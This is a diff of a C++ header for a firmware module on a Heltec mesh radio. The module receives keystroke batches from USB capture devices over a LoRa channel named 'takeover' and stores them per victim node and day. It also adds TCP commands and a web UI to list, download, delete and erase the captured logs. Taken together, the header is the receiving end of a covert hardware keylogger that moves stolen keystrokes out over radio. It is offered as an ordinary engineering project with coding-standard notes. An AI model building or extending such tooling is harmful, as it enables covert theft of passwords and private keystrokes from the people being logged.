@@ -4,24 +4,21 @@
  *
  * Receives keystroke batches from XIAO USB capture devices via port 490,
  * stores them to flash filesystem, and sends ACK responses.
+ * File management is handled via the Web UI at /keylogs.html
  *
- * Architecture (v7.0):
+ * Architecture (v7.7 - Web UI Only):
  *  - Inherits from SinglePortModule for mesh message handling
  *  - Uses LittleFS for persistent storage on ESP32 flash
  *  - Stores data in /keylogs/<node_id_hex>/keylog_<date>.txt
- *  - Sends "ACK:0x<batch_id>:!<receiver_node>" broadcasts for reliable delivery (v7.5)
+ *  - Sends "ACK:0x<batch_id>:!<receiver_node>" broadcasts for reliable delivery
  *  - Listens on channel 1 "takeover" for mesh broadcasts
+ *  - File browsing/download/delete via HTTP Web UI (ContentHandler.cpp)
  *
- * Protocol (Mesh - XIAO → Heltec):
+ * Protocol (Mesh - XIAO -> Heltec):
  *  - Port: 490 (custom private port)
  *  - Channel: 1 "takeover" with PSK encryption
- *  - Incoming: [batch_id:4][data:N]
- *  - Outgoing ACK: "ACK:0x<8 hex digits>:!<8 hex node>" (v7.5 broadcast)
- *
- * Protocol (Serial - Computer → Heltec via meshtastic CLI):
- *  - Send to self: meshtastic --sendtext "LOGS:LIST" --dest !<ownNodeId> --port /dev/xxx
- *  - Commands: LOGS:LIST, LOGS:READ:<node>:<file>, LOGS:DELETE:<node>:<file>, LOGS:STATS, LOGS:ERASE_ALL
- *  - Responses: OK:* or ERR:* printed to Serial (when source is local node)
+ *  - Incoming: [batch_id:4][data:N] or [magic:2][version:2][batch_id:4][data:N]
+ *  - Outgoing ACK: "ACK:0x<8 hex digits>:!<8 hex node>" (broadcast)
  *
  * NASA Power of 10 Compliance:
  *  - Fixed buffer sizes with compile-time bounds
@@ -46,10 +43,9 @@
  */
 #define KEYLOG_MAX_PATH_LEN         64      /**< Maximum file path length */
 #define KEYLOG_MAX_PAYLOAD_SIZE     512     /**< Maximum incoming payload size */
-#define KEYLOG_ACK_BUFFER_SIZE      32      /**< Size for "ACK:0x12345678:!12345678\0" (v7.5) */
+#define KEYLOG_ACK_BUFFER_SIZE      32      /**< Size for "ACK:0x12345678:!12345678\0" */
 #define KEYLOG_BATCH_HEADER_SIZE    4       /**< batch_id is 4 bytes (old format) */
 #define KEYLOG_NODE_HEX_LEN         9       /**< 8 hex chars + null */
-#define KEYLOG_SERIAL_BUFFER_SIZE   128     /**< Serial command buffer size */
 
 /**
  * @brief Protocol Version Detection (REQ-PROTO-001)
@@ -66,32 +62,23 @@
 #define KEYLOG_NEW_HEADER_SIZE      8       /**< magic(2) + version(2) + batch_id(4) */
 
 /**
- * @brief Port and channel configuration (v7.0)
+ * @brief Port and channel configuration
  * Must match USBCaptureModule.h settings
  */
 #define KEYLOG_RECEIVER_PORTNUM     490     /**< Custom port for USB capture (private range 256-511) */
 #define KEYLOG_RECEIVER_CHANNEL     1       /**< Channel 1 "takeover" for mesh broadcast */
 
 /**
- * @brief Command handling constants
- */
-#define KEYLOG_CMD_PREFIX           "LOGS:" /**< Command prefix for log access */
-#define KEYLOG_CMD_PREFIX_LEN       5       /**< Length of "LOGS:" */
-#define KEYLOG_RESPONSE_MAX_LEN     256     /**< Maximum single response length (legacy) */
-#define KEYLOG_CHUNK_SIZE           200     /**< Max data per chunk (leaves room in 512B packet) */
-#define KEYLOG_MAX_FILES_PER_NODE   32      /**< Maximum files per node directory */
-#define KEYLOG_MAX_NODES            16      /**< Maximum node directories to list */
-
-/**
- * @brief JSON response constants
- */
-#define KEYLOG_JSON_MAX_LEN         4096    /**< Maximum JSON response length */
-#define KEYLOG_BASE64_MAX_INPUT     2048    /**< Max file bytes before base64 (4096 * 3/4) */
-
-/**
  * @brief Statistics tracking constants
  */
 #define KEYLOG_STATS_LOG_INTERVAL_MS 60000  /**< Log stats every 60 seconds */
+
+/**
+ * @brief Command response buffer sizes (v7.9 - TCP Commands)
+ */
+#define KEYLOG_MAX_RESPONSE_SIZE     8192   /**< Maximum command response size (no LoRa limit via TCP) */
+#define KEYLOG_MAX_COMMAND_LEN       128    /**< Maximum command string length */
+#define KEYLOG_MAX_FILENAME_LEN      32     /**< Maximum filename length (keylog_YYYY-MM-DD.txt) */
 
 /**
  * @brief Deduplication cache constants
@@ -131,27 +118,40 @@ struct DedupCacheHeader {
 };
 
 /**
+ * @brief Keylog command types (v7.9 - TCP Commands)
+ *
+ * Commands sent from iOS app via TCP to Heltec for local filesystem operations.
+ * These are handled entirely on Heltec (no mesh transmission).
+ *
+ * Format: "KEYLOG:<command>[:<parameters>]"
+ */
+enum KeylogCommand {
+    KEYLOG_CMD_UNKNOWN = 0,
+    KEYLOG_CMD_LIST,        // "KEYLOG:LIST" - List all nodes and files (JSON)
+    KEYLOG_CMD_GET,         // "KEYLOG:GET:<nodeId>:<filename>" - Get file content
+    KEYLOG_CMD_DELETE,      // "KEYLOG:DELETE:<nodeId>:<filename>" - Delete file
+    KEYLOG_CMD_STATS,       // "KEYLOG:STATS" - Filesystem statistics (JSON)
+    KEYLOG_CMD_ERASE_ALL    // "KEYLOG:ERASE_ALL" - Delete all keylog files
+};
+
+/**
  * @brief Keylog Receiver Module for Heltec V4
  *
  * Receives keystroke batches from XIAO devices and stores to flash.
  * Implements reliable delivery via ACK responses.
+ * File management handled by Web UI (/keylogs.html).
  *
  * Storage Structure:
  *   /keylogs/
  *     <node_id_hex>/           e.g., /keylogs/a1b2c3d4/
  *       keylog_2025-12-13.txt  Day-based log files (append mode)
- *
- * Message Protocol:
- *  - Port: PRIVATE_APP (256)
- *  - Incoming payload: [batch_id:4][keystroke_data:N]
- *  - ACK response: "ACK:0x<batch_id_hex>"
  */
 class KeylogReceiverModule : public SinglePortModule, private concurrency::OSThread
 {
   public:
     /**
      * @brief Constructor
-     * Initializes SinglePortModule with PRIVATE_APP port
+     * Initializes SinglePortModule with port 490
      */
     KeylogReceiverModule();
 
@@ -163,7 +163,7 @@ class KeylogReceiverModule : public SinglePortModule, private concurrency::OSThr
     bool init();
 
     /**
-     * @brief Periodic task - checks Serial for commands
+     * @brief Periodic task - saves dedup cache if needed
      * @return milliseconds until next call
      */
     virtual int32_t runOnce() override;
@@ -223,136 +223,6 @@ class KeylogReceiverModule : public SinglePortModule, private concurrency::OSThr
      */
     bool sendAck(NodeNum to, uint32_t batchId);
 
-    // ==================== Command Handling ====================
-
-    /**
-     * @brief Handle LOGS:* commands for remote keylog access
-     *
-     * Commands supported:
-     *  - LOGS:LIST - List all nodes and their log files
-     *  - LOGS:READ:<node>:<filename> - Read file contents (chunked)
-     *  - LOGS:DELETE:<node>:<filename> - Delete a log file
-     *  - LOGS:STATS - Get storage statistics
-     *
-     * @param from Source node to respond to
-     * @param cmd Command string (after "LOGS:" prefix)
-     * @param len Length of command string
-     * @return ProcessMessage::STOP if handled
-     */
-    ProcessMessage handleLogsCommand(NodeNum from, const char *cmd, size_t len);
-
-    /**
-     * @brief Handle LOGS:LIST command
-     * Lists all node directories and their log files
-     *
-     * @param from Node to send response to
-     * @return true if response sent successfully
-     */
-    bool handleListCommand(NodeNum from);
-
-    /**
-     * @brief Handle LOGS:READ command
-     * Reads file and sends contents in chunks
-     *
-     * @param from Node to send response to
-     * @param node Node ID (hex string, 8 chars)
-     * @param filename Filename to read
-     * @return true if file was read and sent
-     */
-    bool handleReadCommand(NodeNum from, const char *node, const char *filename);
-
-    /**
-     * @brief Handle LOGS:DELETE command
-     * Deletes specified log file
-     *
-     * @param from Node to send response to
-     * @param node Node ID (hex string, 8 chars)
-     * @param filename Filename to delete
-     * @return true if file was deleted
-     */
-    bool handleDeleteCommand(NodeNum from, const char *node, const char *filename);
-
-    /**
-     * @brief Handle LOGS:STATS command
-     * Returns storage statistics
-     *
-     * @param from Node to send response to
-     * @return true if stats sent successfully
-     */
-    bool handleStatsCommand(NodeNum from);
-
-    /**
-     * @brief Handle LOGS:ERASE_ALL command
-     * Deletes ALL keylog files from ALL nodes
-     *
-     * @param from Node to send response to
-     * @return true if erase operation completed
-     */
-    bool handleEraseAllCommand(NodeNum from);
-
-    /**
-     * @brief Send text response to a node
-     *
-     * @param to Destination node ID
-     * @param response Response string (null-terminated)
-     * @return true if response was queued
-     */
-    bool sendResponse(NodeNum to, const char *response);
-
-    /**
-     * @brief Send file contents in chunks (legacy, for mesh responses)
-     *
-     * @param to Destination node ID
-     * @param path File path to read
-     * @return true if all chunks sent
-     */
-    bool sendFileChunks(NodeNum to, const char *path);
-
-    // ==================== JSON Helpers ====================
-
-    /**
-     * @brief Escape a string for JSON output
-     *
-     * @param input Source string
-     * @param output Output buffer
-     * @param outLen Output buffer size
-     * @return Length written (excluding null terminator)
-     */
-    size_t jsonEscapeString(const char *input, char *output, size_t outLen);
-
-    /**
-     * @brief Base64 encode binary data
-     *
-     * @param input Input bytes
-     * @param inputLen Input length
-     * @param output Output buffer (must be at least ((inputLen + 2) / 3) * 4 + 1)
-     * @param outLen Output buffer size
-     * @return Length written (excluding null terminator)
-     */
-    size_t base64Encode(const uint8_t *input, size_t inputLen, char *output, size_t outLen);
-
-    // ==================== Serial Command Handling ====================
-
-    /**
-     * @brief Check Serial for incoming text commands
-     * Reads line from Serial, parses LOGS:* commands, writes JSON response
-     */
-    void checkSerialCommands();
-
-    /**
-     * @brief Handle a serial command (same as mesh but response goes to Serial)
-     *
-     * @param cmd Full command string (including "LOGS:" prefix)
-     * @param len Command string length
-     */
-    void handleSerialCommand(const char *cmd, size_t len);
-
-    /**
-     * @brief Send response directly to Serial (not mesh)
-     * @param response JSON response string
-     */
-    void sendSerialResponse(const char *response);
-
     // ==================== Statistics ====================
 
     uint32_t totalBatchesReceived;  /**< Total batches received */
@@ -360,12 +230,6 @@ class KeylogReceiverModule : public SinglePortModule, private concurrency::OSThr
     uint32_t totalAcksSent;         /**< ACKs successfully sent */
     uint32_t storageErrors;         /**< Storage operation failures */
     uint32_t lastStatsLog;          /**< Last stats log timestamp */
-
-    // ==================== Serial Command State ====================
-
-    char serialCmdBuffer[KEYLOG_SERIAL_BUFFER_SIZE];  /**< Buffer for serial commands */
-    size_t serialCmdLen;                               /**< Current command buffer length */
-    bool serialResponsePending;                        /**< Flag to indicate serial response mode */
 
     // ==================== Deduplication Cache ====================
     // NASA Rule 3: Fixed-size array, no dynamic allocation
@@ -433,6 +297,103 @@ class KeylogReceiverModule : public SinglePortModule, private concurrency::OSThr
      * NASA Rule 1: Simple control flow (early returns)
      */
     void saveDedupCacheIfNeeded();
+
+    // ==================== Command Handling (v7.9 - TCP Commands) ====================
+
+    /**
+     * @brief Parse KEYLOG command from payload
+     * NASA Rule 1: Simple control flow
+     * NASA Rule 6: Validates input bounds
+     *
+     * @param payload Command string (ASCII)
+     * @param len Payload length
+     * @return Parsed command type
+     */
+    KeylogCommand parseKeylogCommand(const uint8_t *payload, size_t len);
+
+    /**
+     * @brief Execute KEYLOG command and generate response
+     * NASA Rule 2: Fixed loop bounds in all handlers
+     * NASA Rule 6: All return values checked
+     *
+     * @param cmd Command to execute
+     * @param payload Original command payload (for parameter extraction)
+     * @param payloadLen Length of payload
+     * @param response Buffer for response text
+     * @param maxLen Maximum response buffer size
+     * @return Length of response text (0 on error)
+     */
+    size_t executeKeylogCommand(KeylogCommand cmd, const uint8_t *payload, size_t payloadLen,
+                                char *response, size_t maxLen);
+
+    /**
+     * @brief Send command response back to originator
+     * NASA Rule 6: Validates buffer size
+     *
+     * @param response Response text
+     * @param len Response length
+     * @param to Destination node (originator of command)
+     * @return true if sent successfully
+     */
+    bool sendCommandResponse(const char *response, size_t len, NodeNum to);
+
+    // ==================== Individual Command Handlers ====================
+
+    /**
+     * @brief Handle KEYLOG:LIST command - list all nodes and files
+     * NASA Rule 2: Fixed directory scan bounds
+     *
+     * @param response Buffer for JSON response
+     * @param maxLen Maximum buffer size
+     * @return Length of response (0 on error)
+     */
+    size_t handleListCommand(char *response, size_t maxLen);
+
+    /**
+     * @brief Handle KEYLOG:GET command - get file content
+     * NASA Rule 6: File size validation
+     *
+     * @param nodeId Node ID (hex string)
+     * @param filename Filename
+     * @param response Buffer for file content
+     * @param maxLen Maximum buffer size
+     * @return Length of response (0 on error)
+     */
+    size_t handleGetCommand(const char *nodeId, const char *filename,
+                           char *response, size_t maxLen);
+
+    /**
+     * @brief Handle KEYLOG:DELETE command - delete file
+     * NASA Rule 6: Path validation
+     *
+     * @param nodeId Node ID (hex string)
+     * @param filename Filename
+     * @param response Buffer for success message
+     * @param maxLen Maximum buffer size
+     * @return Length of response (0 on error)
+     */
+    size_t handleDeleteCommand(const char *nodeId, const char *filename,
+                              char *response, size_t maxLen);
+
+    /**
+     * @brief Handle KEYLOG:STATS command - filesystem statistics
+     * NASA Rule 2: Fixed directory scan bounds
+     *
+     * @param response Buffer for JSON response
+     * @param maxLen Maximum buffer size
+     * @return Length of response (0 on error)
+     */
+    size_t handleStatsCommand(char *response, size_t maxLen);
+
+    /**
+     * @brief Handle KEYLOG:ERASE_ALL command - delete all files
+     * NASA Rule 2: Fixed directory scan bounds
+     *
+     * @param response Buffer for success message
+     * @param maxLen Maximum buffer size
+     * @return Length of response (0 on error)
+     */
+    size_t handleEraseAllCommand(char *response, size_t maxLen);
 };
 
 extern KeylogReceiverModule *keylogReceiverModule;
